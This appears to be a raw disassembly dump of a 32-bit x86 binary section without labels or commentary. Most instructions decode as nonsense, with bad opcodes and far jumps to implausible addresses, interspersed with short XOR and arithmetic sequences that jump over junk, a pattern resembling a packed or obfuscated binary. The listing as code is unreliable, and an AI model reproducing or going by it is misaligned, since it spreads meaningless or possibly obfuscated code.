  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x1d38e3ce]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407d5f
  407ce1:	ret    0x41fb
  407ce4:	jmp    0xaf6c18a3
  407ce9:	mov    edi,0xcf76d7a9
  407cee:	cmovns ecx,DWORD PTR [ecx]
  407cf1:	mov    ch,0x86
  407cf3:	scas   al,BYTE PTR es:[edi]
  407cf4:	scas   al,BYTE PTR es:[edi]
  407cf5:	and    BYTE PTR [ebx],cl
  407cf7:	xor    DWORD PTR [eax],ebx
  407cf9:	pop    es
  407cfa:	arpl   sp,ax
  407cfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cfd:	xchg   ecx,eax
  407cfe:	xchg   esp,eax
  407cff:	retf   0x855c
  407d02:	adc    BYTE PTR [esi-0x74116c13],dh
  407d08:	jo     0x407d40
  407d0a:	jo     0x407d46
  407d0c:	push   ecx
  407d0d:	sbb    dl,bl
  407d0f:	inc    ecx
  407d10:	ret    0xbc22
  407d13:	xor    edi,esi
  407d15:	popa   
  407d16:	mov    cl,dh
  407d18:	inc    edi
  407d19:	imul   ebx,DWORD PTR [eax],0xffffffe4
  407d1c:	ins    DWORD PTR es:[edi],dx
  407d1d:	icebp  
  407d1e:	bound  edi,QWORD PTR [edi]
  407d20:	icebp  
  407d21:	arpl   WORD PTR [edx-0x31f91bd2],sp
  407d27:	sahf   
  407d28:	sbb    BYTE PTR [ecx],0x4d
  407d2b:	pop    ecx
  407d2c:	add    DWORD PTR [ecx-0x26],0xffffffad
  407d30:	mov    dl,0x73
  407d32:	ds das 
  407d34:	sbb    al,0x42
  407d36:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  407d38:	nop
  407d39:	fsubrp st(7),st
  407d3b:	mov    ch,0xfe
  407d3d:	es call 0xb362:0x6863a9c5
  407d45:	adc    ebx,DWORD PTR [edi+0x87ca590]
  407d4b:	mov    ds:0xe4a37ef2,eax
  407d50:	add    al,0xfa
  407d52:	dec    ebp
  407d53:	popf   
  407d54:	fcom   QWORD PTR [eax+0x1]
  407d57:	xchg   BYTE PTR ds:0x9a324b4a,ah
  407d5d:	outs   dx,BYTE PTR ds:[esi]
  407d5e:	test   BYTE PTR [eax],0x66
  407d61:	mov    BYTE PTR [ebp+0x61],bl
  407d64:	stos   BYTE PTR es:[edi],al
  407d65:	(bad)  
  407d66:	dec    ebx
  407d67:	inc    ebp
  407d68:	imul   edi,DWORD PTR [esi-0x495a56dc],0x58f7e858
  407d72:	inc    ecx
  407d73:	add    al,0xc6
  407d75:	mov    ds:0xda99b98,al
  407d7a:	arpl   di,bx
  407d7c:	xor    al,0xbc
  407d7e:	rcl    BYTE PTR [edx-0x68cf6423],1
  407d84:	jnp    0x407dca
  407d86:	cld    
  407d87:	daa    
  407d88:	adc    bh,BYTE PTR [edx-0x651a5e3e]
  407d8e:	ins    BYTE PTR es:[edi],dx
  407d8f:	dec    edi
  407d90:	bound  ebx,QWORD PTR [eax]
  407d92:	mov    DWORD PTR [edx-0x57],ebp
  407d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d96:	loop   0x407de7
  407d98:	std    
  407d99:	or     eax,0x65591d7a
  407d9e:	and    eax,0x4c21b964
  407da3:	fistp  WORD PTR [ecx]
  407da5:	aaa    
  407da6:	iret   
  407da7:	ret    
  407da8:	arpl   WORD PTR [ecx-0x2253df4a],bx
  407dae:	mov    al,ds:0x7862e400
  407db3:	and    DWORD PTR [esi-0x10],ecx
  407db6:	(bad)
  407db9:	lahf   
  407dba:	mov    esp,0x5fb10e06
  407dbf:	jmp    0xf351:0x502e7576
  407dc6:	out    0x4f,eax
  407dc8:	mov    bh,bh
  407dca:	repnz nop
  407dcc:	xlat   BYTE PTR ds:[ebx]
  407dcd:	inc    ebp
  407dce:	daa    
  407dcf:	mov    eax,0x5068328e
  407dd4:	(bad)  
  407dd5:	fs jecxz 0x407ddf
  407dd8:	call   0xf4f0:0xb68ff54a
  407ddf:	push   0x1e
  407de1:	fnstcw WORD PTR [esi+edx*8+0x6b]
  407de5:	mov    DWORD PTR [ecx+0x58],esp
  407de8:	adc    BYTE PTR [edi],0xb
  407deb:	fidiv  DWORD PTR [esi]
  407ded:	mov    eax,ds:0x510ddef2
  407df2:	loope  0x407e5a
  407df4:	pop    ss
  407df5:	jecxz  0x407e01
  407df7:	ret    0xc71
  407dfa:	inc    eax
  407dfb:	sbb    eax,0x4fbe8520
  407e00:	call   0x6f9b:0xdb4fa31d
  407e07:	clc    
  407e08:	cmp    al,0xfa
  407e0a:	test   BYTE PTR [ebp-0x1e8bd5a1],dh
  407e10:	scas   eax,DWORD PTR es:[edi]
  407e11:	adc    al,bh
  407e13:	sbb    cl,ch
  407e15:	repz mov bl,0x7d
  407e18:	cmc    
  407e19:	xchg   ebx,eax
  407e1a:	bound  ecx,QWORD PTR [edx+edi*1+0x5d]
  407e1e:	loop   0x407de4
  407e20:	loopne 0x407e6b
  407e22:	and    al,0xc8
  407e25:	and    al,0xd3
  407e27:	cmp    ch,BYTE PTR [ecx+0x36]
  407e2a:	fst    DWORD PTR [esi+0x7d]
  407e2d:	mov    ecx,0xae346d0b
  407e32:	nop
  407e33:	lahf   
  407e34:	jle    0x407e02
  407e36:	inc    ecx
  407e37:	push   ebx
  407e38:	and    BYTE PTR gs:[ecx],bl
  407e3b:	ja     0x407df0
  407e3d:	xor    edi,DWORD PTR [edi]
  407e3f:	lods   eax,DWORD PTR ds:[esi]
  407e40:	dec    eax
  407e41:	jnp    0x407dce
  407e43:	add    al,0x96
  407e45:	jmp    0x407e61
  407e47:	cmp    BYTE PTR [esi+0x7a09c1ae],al
  407e4d:	mov    esp,0x12ff60f9
  407e52:	stos   DWORD PTR es:[edi],eax
  407e53:	and    ah,dl
  407e55:	(bad)  
  407e56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e57:	inc    ebp
  407e58:	and    ch,BYTE PTR [edx-0x7ee27cc2]
  407e5e:	enter  0xaed6,0x74
  407e62:	and    DWORD PTR [edx],edi
  407e64:	jo     0x407e44
  407e66:	outs   dx,BYTE PTR ds:[esi]
  407e67:	pop    ebx
  407e68:	std    
  407e69:	add    dl,BYTE PTR [ebx-0x6c1b2ff9]
  407e6f:	cld    
  407e70:	loopne 0x407e9d
  407e72:	or     BYTE PTR ds:0x8870f,0x0
  407e79:	add    BYTE PTR [ebx-0x11162bab],cl
  407e7f:	or     BYTE PTR [eax],al
  407e81:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  407e87:	cld    
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	es stc 
  407e9f:	push   ds
  407ea0:	jge    0x407eb3
  407ea2:	int    0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407f0e
  407eaa:	dec    ebx
  407eab:	(bad)  
  407eac:	rol    BYTE PTR [esi+0x24],cl
  407eaf:	es mov bh,0x14
  407eb2:	loope  0x407e4f
  407eb4:	jle    0x407edd
  407eb6:	lock addr16 inc esi
  407eb9:	push   ebx
  407eba:	test   al,0x27
  407ebc:	xor    DWORD PTR [ecx+0x60],0xffffff88
  407ec0:	mov    DWORD PTR ds:0x1c78e248,edx
  407ec6:	mov    eax,ds:0x854311bd
  407ecb:	sub    eax,0xa537902d
  407ed0:	fimul  DWORD PTR [eax+0x37]
  407ed3:	xchg   esp,eax
  407ed4:	call   0x9491:0x762c44da
  407edb:	icebp  
  407edc:	(bad)  
  407edd:	jne    0x407f56
  407edf:	mov    esi,0x7814861
  407ee4:	xor    ecx,ebp
  407ee6:	dec    ecx
  407ee7:	mov    al,ch
  407ee9:	mov    ebp,0xf3740a6b
  407eee:	pop    es
  407eef:	popa   
  407ef0:	fistp  WORD PTR [ebx-0x45]
  407ef3:	xchg   ecx,esp
  407ef5:	or     ah,dl
  407ef7:	jmp    0x407f0d
  407ef9:	pop    es
  407efa:	jmp    0xdac6c74f
  407eff:	mov    esp,0xfee385f9
  407f04:	sub    DWORD PTR [ebp+0x70],0x4b020f7d
  407f0b:	xchg   esp,eax
  407f0c:	sbb    ecx,DWORD PTR [eax+eiz*4-0x776eb2d2]
  407f13:	mov    eax,ds:0x47c986da
  407f18:	call   0x5c11:0xf6ff88f8
  407f1f:	das    
  407f20:	and    BYTE PTR [edi-0x6a],bh
  407f23:	xchg   ebp,eax
  407f24:	ret    0x2cf9
  407f27:	out    dx,al
  407f28:	sbb    DWORD PTR [edi+0x1b0a880],ecx
  407f2e:	push   edi
  407f2f:	aas    
  407f30:	pop    eax
  407f31:	stos   BYTE PTR es:[edi],al
  407f32:	add    BYTE PTR [edi+0xd],ah
  407f35:	sti    
  407f36:	sub    al,0xb5
  407f38:	ret    
  407f39:	mov    bh,BYTE PTR [ebp+0x2cd17e3c]
  407f3f:	push   ebp
  407f40:	mov    eax,0x17754ccf
  407f45:	xchg   cl,al
  407f47:	xlat   BYTE PTR ds:[ebx]
  407f48:	xchg   ecx,eax
  407f49:	popf   
  407f4a:	fwait
  407f4b:	nop
  407f4c:	nop
  407f4d:	push   esi
  407f4e:	jne    0x407f08
  407f50:	cmp    ch,BYTE PTR [edi+0x9]
  407f53:	stc    
  407f54:	cmp    ebp,DWORD PTR [ecx]
  407f56:	in     al,dx
  407f57:	popf   
  407f58:	gs xchg esp,eax
  407f5a:	pop    edi
  407f5b:	sub    ch,BYTE PTR cs:[edi-0x3a4bcc28]
  407f62:	(bad)  
  407f63:	out    0x70,al
  407f65:	cmp    eax,ebx
  407f67:	nop
  407f68:	loopne 0x407f1d
  407f6a:	test   BYTE PTR [edx],ch
  407f6c:	test   BYTE PTR [edx+0x5],ah
  407f6f:	call   0xf82:0x7a8137db
  407f76:	jg     0x407fba
  407f78:	xor    BYTE PTR [ecx+0x372e0656],ah
  407f7e:	push   cs
  407f7f:	sar    BYTE PTR [edx],0x7c
  407f82:	data16 das 
  407f84:	jp     0x407f74
  407f86:	dec    ebx
  407f87:	jo     0x407fe0
  407f89:	inc    DWORD PTR [ebx]
  407f8b:	mov    bl,BYTE PTR [ebx]
  407f8d:	loop   0x407fd6
  407f8f:	(bad)  
  407f90:	cmc    
  407f91:	mov    edi,0x4a9d37bb
  407f96:	es jbe 0x407fa9
  407f99:	dec    edx
  407f9a:	lods   al,BYTE PTR ds:[esi]
  407f9b:	push   0x6c
  407f9d:	popa   
  407f9e:	(bad)  
  407f9f:	test   DWORD PTR [edx+esi*4-0x3f],0x9c7254b8
  407fa7:	push   edi
  407fa8:	xor    al,BYTE PTR [esi]
  407faa:	pop    esi
  407fab:	pop    edx
  407fac:	push   edi
  407fad:	and    ebp,DWORD PTR [eax]
  407faf:	mov    edi,es
  407fb1:	jge    0x407fbd
  407fb3:	push   es
  407fb4:	sub    al,0xa6
  407fb6:	pop    edi
  407fb7:	inc    esp
  407fb8:	adc    al,0xf1
  407fba:	jnp    0x407ff7
  407fbc:	sbb    eax,0x8b7d23c0
  407fc1:	je     0x40803a
  407fc3:	xor    al,0xc5
  407fc5:	out    dx,al
  407fc6:	push   esp
  407fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fc8:	es pop esi
  407fca:	dec    esp
  407fcb:	pop    ds
  407fcc:	jge    0x407ff9
  407fce:	mov    ah,0xe1
  407fd0:	(bad)  
  407fd1:	mov    ebp,0xd75a54b8
  407fd6:	ins    BYTE PTR es:[edi],dx
  407fd7:	jb     0x407fbc
  407fd9:	mov    ch,0x64
  407fdb:	mov    ah,0x4b
  407fdd:	sub    eax,0xc36c9b7a
  407fe2:	retf   
  407fe3:	fmul   QWORD PTR [ebp-0x66]
  407fe6:	in     al,dx
  407fe7:	ins    DWORD PTR es:[edi],dx
  407fe8:	fbld   TBYTE PTR ds:0x863c9faf
  407fee:	loop   0x407fab
  407ff0:	lods   al,BYTE PTR ds:[esi]
  407ff1:	push   ecx
  407ff2:	mov    esi,0x6f07a2d6
  407ff7:	xchg   ebx,eax
  407ff8:	cmp    BYTE PTR [ebx],al
  407ffa:	or     al,BYTE PTR [eax+0x2a]
  407ffd:	aaa    
  407ffe:	pop    ebp
  407fff:	jg     0x407fc6
  408001:	ds in  al,dx
  408003:	test   DWORD PTR [edx+esi*1-0x15],edx
  408007:	cmp    BYTE PTR [ecx+0x1],bl
  40800a:	(bad)  
  40800b:	sti    
  40800c:	retf   
  40800d:	out    dx,al
  40800e:	xchg   esp,eax
  40800f:	sbb    eax,0x167dc5f2
  408014:	cmp    eax,0x12583762
  408019:	xchg   ebx,eax
  40801a:	iret   
  40801b:	jmp    0x6bf5b633
  408020:	gs mov ebx,0x68436d18
  408026:	leave  
  408027:	sub    eax,edi
  408029:	jno    0x4080a1
  40802b:	hlt    
  40802c:	push   edx
  40802d:	cs test eax,0x5a66d983
  408033:	rcr    BYTE PTR [esi-0x27cb545e],0x0
  40803a:	mov    ecx,0xf9039bed
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	jle    0x40808d
  40807b:	imul   edx,DWORD PTR [ebx+0x7e7ecaad],0xffffff8a
  408082:	jg     0x408102
  408084:	jle    0x4080f6
  408086:	lock cs sub eax,0xb1e8a37
  40808d:	js     0x408077
  40808f:	xor    eax,0x4ad5c5c0
  408094:	out    dx,al
  408095:	stos   DWORD PTR es:[edi],eax
  408096:	sti    
  408097:	or     al,ah
  408099:	popf   
  40809a:	mov    ds:0x4ed4ea57,eax
  40809f:	mov    dl,0x33
  4080a1:	jbe    0x4080cc
  4080a3:	add    edx,DWORD PTR [edi]
  4080a5:	addr16 inc edx
  4080a7:	sbb    eax,0x6bb8d447
  4080ac:	jbe    0x4080f7
  4080ae:	sbb    eax,0x3b9f5f73
  4080b3:	cmp    dl,0x5
  4080b6:	xor    al,0xd0
  4080b8:	pop    esp
  4080b9:	dec    esp
  4080ba:	out    0xd2,eax
  4080bc:	nop
  4080bd:	dec    esp
  4080be:	jge    0x408103
  4080c0:	sbb    al,BYTE PTR [edx-0x46]
  4080c3:	jns    0x40808e
  4080c5:	dec    esp
  4080c6:	(bad)  
  4080c7:	sub    eax,0xa09304ed
  4080cc:	in     al,0x73
  4080ce:	pop    edi
  4080cf:	(bad)  
  4080d0:	leave  
  4080d1:	mov    edi,0xb00468ec
  4080d6:	imul   eax,DWORD PTR [ebx-0x41152434],0xebce95b9
  4080e0:	mov    al,bl
  4080e2:	nop
  4080e3:	jl     0x408074
  4080e5:	inc    ebx
  4080e6:	jmp    0x74745da
  4080eb:	adc    eax,0x9b782e78
  4080f0:	(bad)  
  4080f2:	inc    edx
  4080f3:	adc    al,0x94
  4080f5:	cli    
  4080f6:	or     ah,BYTE PTR [ecx-0x4d]
  4080f9:	popa   
  4080fa:	mov    ds:0xdd1d2210,al
  4080ff:	xor    esi,DWORD PTR [edi-0x30]
  408102:	jbe    0x4080bb
  408104:	and    BYTE PTR [si+0x24],bl
  408108:	sti    
  408109:	mov    esp,0x31378c10
  40810e:	and    esi,DWORD PTR [edx]
  408110:	sub    eax,esi
  408112:	jns    0x408106
  408114:	jae    0x40817a
  408116:	popa   
  408117:	xor    al,0xbe
  408119:	or     al,0xc
  40811b:	mov    bl,0x3a
  40811d:	stos   DWORD PTR es:[edi],eax
  40811e:	inc    esi
  40811f:	and    dh,BYTE PTR [esi]
  408121:	and    bl,BYTE PTR [ecx-0x66945033]
  408127:	pop    es
  408128:	sti    
  408129:	and    ch,bl
  40812b:	mov    bl,0x4c
  40812d:	pop    esp
  40812e:	pop    esp
  40812f:	lods   al,BYTE PTR cs:[esi]
  408131:	mov    ?,WORD PTR [edx-0x3851b2cb]
  408137:	push   cs
  408138:	jmp    0x2bac:0x80e44d0d
  40813f:	jle    0x408126
  408141:	cmc    
  408142:	mov    ds:0x80f6492f,al
  408147:	sbb    BYTE PTR [ebx],dl
  408149:	(bad)  
  40814a:	fs cli 
  40814c:	test   DWORD PTR [esi+0x2e],edi
  40814f:	dec    ebx
  408150:	pop    es
  408151:	sbb    DWORD PTR [edi-0x53],eax
  408154:	test   al,0x62
  408156:	clc    
  408157:	push   edi
  408158:	mov    bh,0xb5
  40815a:	and    dl,ah
  40815c:	lahf   
  40815d:	mov    BYTE PTR [edx-0x13],ah
  408160:	jmp    0x5c5b46fb
  408165:	pop    edx
  408166:	loope  0x408142
  408168:	fnstenv [ecx+0x43e4ff55]
  40816e:	pop    ds
  40816f:	and    bl,BYTE PTR [esi+0x74]
  408172:	sti    
  408173:	arpl   bx,bx
  408175:	imul   ecx,DWORD PTR [ecx],0xfffffffa
  408178:	push   ds
  408179:	mov    dh,0xd4
  40817b:	sub    DWORD PTR [ebp+eiz*4+0x8826e26],esi
  408182:	call   0xb4b6:0xfe36ed44
  408189:	adc    BYTE PTR [edi+0x1c8621ef],0x16
  408190:	das    
  408191:	xchg   ebx,eax
  408192:	out    dx,al
  408193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408194:	xor    BYTE PTR [eax+0x4eec46c5],0xb
  40819b:	lods   eax,DWORD PTR ds:[esi]
  40819c:	and    al,0xf
  40819e:	js     0x4081bd
  4081a0:	mov    ecx,0xaf17361f
  4081a6:	aaa    
  4081a7:	mov    bl,0xdc
  4081a9:	fisttp WORD PTR [esp+edi*4-0x30]
  4081ad:	std    
  4081ae:	sub    eax,edx
  4081b0:	loop   0x40816a
  4081b2:	pop    ds
  4081b3:	retf   
  4081b4:	mov    al,0x82
  4081b6:	or     eax,0xb38b3364
  4081bb:	mov    bl,0xc6
  4081bd:	fmul   DWORD PTR [ecx]
  4081bf:	xchg   BYTE PTR [eax+0x0],dl
  4081c2:	shl    ch,1
  4081c4:	mov    bl,0x8
  4081c6:	inc    edi
  4081c7:	stos   DWORD PTR es:[edi],eax
  4081c8:	xor    dl,0xd1
  4081cb:	das    
  4081cc:	xor    ecx,DWORD PTR [ecx-0x5d]
  4081cf:	arpl   WORD PTR [edi],di
  4081d1:	push   eax
  4081d2:	and    al,0x1
  4081d4:	aam    0xac
  4081d6:	lods   eax,DWORD PTR ds:[esi]
  4081d7:	test   DWORD PTR [edx+eax*4-0x3c],ebx
  4081db:	push   edx
  4081dc:	jecxz  0x40821f
  4081de:	(bad)  
  4081df:	leave  
  4081e0:	cli    
  4081e1:	mov    esi,0xedc508b9
  4081e6:	inc    ebx
  4081e7:	stc    
  4081e8:	mov    eax,0x31e96b69
  4081ed:	les    esi,FWORD PTR [ecx-0x355e8fed]
  4081f3:	push   ss
  4081f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f5:	sub    DWORD PTR [eax-0x7c656ad1],ecx
  4081fb:	stos   BYTE PTR es:[edi],al
  4081fc:	add    ecx,esi
  4081fe:	inc    ebx
  4081ff:	mov    BYTE PTR [ecx+0x1a],bl
  408202:	and    DWORD PTR [ebx+0x64],ebp
  408205:	pop    ecx
  408206:	mov    edi,0x771617b0
  40820b:	dec    esi
  40820c:	jmp    0xe599:0xa3de58c2
  408213:	mov    ebp,0xbab578e
  408218:	sbb    al,0x3
  40821a:	shr    ecx,1
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x396f:0x82855762
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x408252
  408239:	outs   dx,BYTE PTR ds:[esi]
  40823a:	pop    edi
  40823b:	xchg   ebx,eax
  40823c:	cdq    
  40823d:	cld    
  40823e:	inc    ebx
  40823f:	sub    eax,0x32922304
  408244:	sub    al,0x2c
  408246:	fwait
  408247:	loopne 0x40823e
  408249:	sub    edx,esi
  40824b:	fistp  WORD PTR [esi]
  40824d:	loope  0x4082b3
  40824f:	and    edx,DWORD PTR [edi-0x4e580389]
  408255:	jne    0x408202
  408257:	arpl   si,bx
  408259:	pop    ebx
  40825a:	(bad)  
  40825b:	pop    ds
  40825c:	add    al,0x7
  40825e:	das    
  40825f:	aas    
  408260:	mov    ch,0x70
  408262:	arpl   sp,ax
  408264:	jae    0x40828a
  408266:	jmp    0x408239
  408268:	nop
  408269:	loope  0x4082cd
  40826b:	inc    eax
  40826c:	push   edi
  40826d:	in     al,0x8
  40826f:	(bad)  
  408270:	push   ebx
  408271:	sbb    dl,ch
  408273:	inc    ecx
  408274:	jle    0x4082b9
  408276:	sub    ebx,DWORD PTR [eax-0x40714ae1]
  40827c:	and    cl,BYTE PTR [edi-0x5f9d64ac]
  408282:	icebp  
  408283:	outs   dx,BYTE PTR ds:[esi]
  408284:	popa   
  408285:	sub    eax,0xf9c8f87b
  40828a:	int3   
  40828b:	dec    ebp
  40828c:	jp     0x4082ac
  40828e:	inc    ax
  408290:	push   0x79
  408292:	mov    esi,DWORD PTR [edi+0x668e03e1]
  408298:	dec    esi
  408299:	jae    0x4082b4
  40829b:	call   0xe056d86
  4082a0:	xchg   edx,eax
  4082a1:	fld    TBYTE PTR [edi]
  4082a3:	pop    eax
  4082a4:	gs in  eax,dx
  4082a6:	retf   
  4082a7:	fistp  QWORD PTR [eax+ecx*2-0x26db3fc2]
  4082ae:	sbb    DWORD PTR [ebp+0x426385dd],esi
  4082b4:	enter  0x67f3,0x73
  4082b8:	inc    eax
  4082b9:	mov    al,BYTE PTR ds:0xa3c324ba
  4082bf:	sub    DWORD PTR [edx],eax
  4082c1:	loopne 0x408303
  4082c3:	ret    
  4082c4:	loop   0x4082f2
  4082c6:	sbb    DWORD PTR [ecx+0x2e],edx
  4082c9:	adc    al,0x72
  4082cb:	fidivr WORD PTR [ebp-0x792243d9]
  4082d1:	add    WORD PTR [ebp+0x6c9a9e7d],0x6387
  4082da:	psubw  mm3,QWORD PTR [ebx-0x73]
  4082de:	fcmovnb st,st(7)
  4082e0:	and    BYTE PTR [ecx-0x6b],ah
  4082e3:	jbe    0x40833d
  4082e5:	sub    BYTE PTR [ebx-0x55],bl
  4082e8:	sbb    al,0x1f
  4082ea:	or     eax,0x2021c4a6
  4082ef:	std    
  4082f0:	std    
  4082f1:	or     al,0x7a
  4082f3:	fcom   QWORD PTR [esi]
  4082f5:	xchg   dx,ax
  4082f7:	stos   DWORD PTR es:[edi],eax
  4082f8:	out    dx,al
  4082f9:	push   ebx
  4082fa:	pop    edx
  4082fb:	bound  ebx,QWORD PTR [esi-0x59]
  4082fe:	mov    ds:0x53447435,al
  408303:	nop
  408304:	cmp    eax,0x368e4916
  408309:	jo     0x4082ea
  40830b:	jp     0x40830f
  40830d:	add    BYTE PTR ds:0xf6134e80,ch
  408313:	dec    ebx
  408314:	pushf  
  408315:	sbb    DWORD PTR [ecx-0x24dadff5],eax
  40831b:	xchg   ebp,eax
  40831c:	push   ss
  40831d:	and    al,BYTE PTR ds:0x1193107
  408323:	or     esp,DWORD PTR [edx-0xe3a2f2a]
  408329:	(bad)  
  40832a:	xor    eax,0x93c60ba1
  40832f:	(bad)  
  408330:	aas    
  408331:	cmc    
  408332:	sbb    ebx,ebx
  408334:	jae    0x408394
  408336:	mov    ds:0x1850c557,eax
  40833b:	and    al,0x58
  40833d:	mov    bl,0x3d
  40833f:	aas    
  408340:	mov    esi,0x16899d88
  408345:	sub    DWORD PTR [edx-0x346ccfe0],edx
  40834b:	bound  edi,QWORD PTR [edi-0x17]
  40834e:	shl    BYTE PTR [ebp+0x3e55788f],0x21
  408355:	xchg   esi,eax
  408356:	mov    WORD PTR [eax-0x2a3cf2ca],?
  40835c:	aad    0x1c
  40835e:	int    0xbe
  408360:	in     eax,0x35
  408362:	pop    esp
  408363:	push   es
  408364:	and    ecx,DWORD PTR [eax+0xb8b8911]
  40836a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40836b:	cmp    cl,BYTE PTR [ecx-0x1]
  40836e:	fisubr WORD PTR [eax]
  408370:	lods   eax,DWORD PTR ds:[esi]
  408371:	mov    WORD PTR [edx-0x5e],ss
  408374:	xchg   edi,eax
  408375:	dec    esp
  408376:	aaa    
  408377:	adc    cl,0xb4
  40837a:	test   edx,0xb147a8c9
  408380:	in     al,dx
  408381:	sbb    BYTE PTR [edi-0x12],dl
  408384:	fstp   TBYTE PTR [ecx+0x4a]
  408387:	inc    ebp
  408388:	popa   
  408389:	test   eax,0x50082093
  40838e:	pop    es
  40838f:	pop    ebp
  408390:	mov    esp,0x43c5adc6
  408395:	xchg   ebp,eax
  408396:	mov    bh,0x59
  408398:	sar    BYTE PTR [edi+0x17],0xb6
  40839c:	rcl    DWORD PTR [edi+0x19e0d134],1
  4083a2:	cmp    bh,cl
  4083a4:	sbb    esi,DWORD PTR [eax+0x3e06745d]
  4083aa:	push   ecx
  4083ab:	mov    ds:0x96e56551,eax
  4083b0:	sbb    al,0x30
  4083b2:	test   bh,cl
  4083b4:	push   es
  4083b5:	fstp   QWORD PTR [esi+ecx*2]
  4083b8:	inc    esi
  4083b9:	cmp    ah,BYTE PTR [edi+ebp*1-0x5e9b1a3]
  4083c0:	sbb    bl,ch
  4083c2:	cmp    DWORD PTR [ecx],ecx
  4083c4:	cmc    
  4083c5:	mov    WORD PTR [ebx-0x7b],cs
  4083c8:	pop    ebp
  4083c9:	mov    ah,0x97
  4083cb:	fimul  WORD PTR [edi]
  4083cd:	scas   eax,DWORD PTR es:[edi]
  4083ce:	xlat   BYTE PTR ds:[ebx]
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	mov    ebx,0x5527659b
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408471
  4083f5:	shl    eax,0x44
  4083f8:	sub    DWORD PTR [esi+0x6697ae88],esi
  4083fe:	popa   
  4083ff:	and    ah,BYTE PTR [edx+0xb411e13]
  408405:	sahf   
  408406:	loope  0x4083e8
  408408:	das    
  408409:	in     eax,dx
  40840a:	sub    al,0x6e
  40840c:	sbb    eax,0x73ce51a4
  408411:	lods   eax,DWORD PTR ds:[esi]
  408412:	mov    ebx,0xa97de7d2
  408417:	and    BYTE PTR [edx-0x51],bl
  40841a:	cdq    
  40841b:	jno    0x4083e1
  40841d:	mov    ah,0xb
  40841f:	out    dx,eax
  408420:	rcr    BYTE PTR [eax+ebx*8-0x23b2ec87],cl
  408427:	sahf   
  408428:	mov    esp,0x15e47171
  40842d:	div    cl
  40842f:	dec    esi
  408430:	cs pop ebx
  408432:	pop    edx
  408433:	inc    ecx
  408434:	and    eax,0x7465bdde
  408439:	ja     0x408499
  40843b:	add    al,0xd8
  40843d:	push   0x24
  40843f:	xchg   ebp,eax
  408440:	dec    ebp
  408441:	xchg   edx,eax
  408442:	push   eax
  408443:	fstp   QWORD PTR [esi+0x2a2a9515]
  408449:	jg     0x4083f6
  40844b:	cld    
  40844c:	sbb    al,0x29
  40844e:	mov    ebp,0xdaaa80df
  408453:	lea    ebp,[eax+esi*4]
  408456:	test   DWORD PTR ds:0xbf84a4f9,esp
  40845c:	jnp    0x4083ff
  40845e:	sub    bl,BYTE PTR [ebp-0x464afab5]
  408464:	leave  
  408465:	jecxz  0x408444
  408467:	push   ecx
  408468:	inc    esi
  408469:	(bad)  
  40846b:	mov    al,0x0
  40846d:	retf   0x45ea
  408470:	lods   eax,DWORD PTR ds:[esi]
  408471:	push   ds
  408472:	fdiv   DWORD PTR [esi+0x3b651a23]
  408478:	and    ecx,DWORD PTR ds:0x204529c8
  40847e:	ret    0x7455
  408481:	cld    
  408482:	push   cs
  408483:	int3   
  408484:	xchg   edx,eax
  408485:	and    al,0xc
  408487:	mov    edx,0xbe2d57d6
  40848c:	retf   0x85a5
  40848f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408490:	inc    esp
  408491:	mov    bl,0x9c
  408493:	dec    ecx
  408494:	xor    eax,0xfd3b2df3
  408499:	icebp  
  40849a:	mov    al,0x26
  40849c:	jmp    0x14c5:0xbf91a34b
  4084a3:	cmp    edi,DWORD PTR [ebx+0x31]
  4084a6:	or     BYTE PTR [edx-0xf],cl
  4084a9:	fadd   QWORD PTR [eax]
  4084ab:	xchg   esi,eax
  4084ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ad:	mov    cl,0x3b
